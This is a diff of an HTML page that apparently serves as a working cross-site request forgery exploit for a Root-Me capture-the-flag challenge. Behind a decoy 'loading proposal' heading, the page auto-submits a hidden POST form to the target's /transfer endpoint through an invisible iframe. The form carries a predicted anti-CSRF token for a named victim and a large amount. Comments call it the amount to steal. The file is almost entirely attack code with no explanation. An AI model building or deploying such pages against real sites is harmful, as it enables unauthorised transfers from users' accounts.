@@ -1,29 +1,24 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Cargando proyecto...</title>
+</head>
 <body>
+    <h1>Cargando la propuesta para the_dwalt00ns...</h1>
+    
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+    <form id="csrf-form" action="https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer" method="POST" target="hidden_iframe">
+        <input type="hidden" name="token" value="6594d3fb4300bf02000000" />
+        <input type="hidden" name="recipient" value="test" /> <input type="hidden" name="amount" value="1000000" />
+    </form>
+
     <script>
-        // Usamos un formulario dinámico para asegurar el envío
-        var b = document.createElement("form");
-        b.action = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer";
-        b.method = "POST";
-        
-        // Datos del ataque
-        var fields = {
-            "token": "6594d3fb4300bf02000001", // Token predicho de the_dwalt00ns
-            "recipient": "test",             // TU usuario
-            "amount": "100000000"           // Cantidad a robar
+        // Enviamos el formulario al iframe oculto
+        window.onload = function() {
+            document.getElementById('csrf-form').submit();
+            console.log("Ataque enviado al iframe.");
         };
-
-        for (var key in fields) {
-            var input = document.createElement("input");
-            input.type = "hidden";
-            input.name = key;
-            input.value = fields[key];
-            b.appendChild(input);
-        }
-
-        document.body.appendChild(b);
-        b.submit();
     </script>
 </body>
 </html>
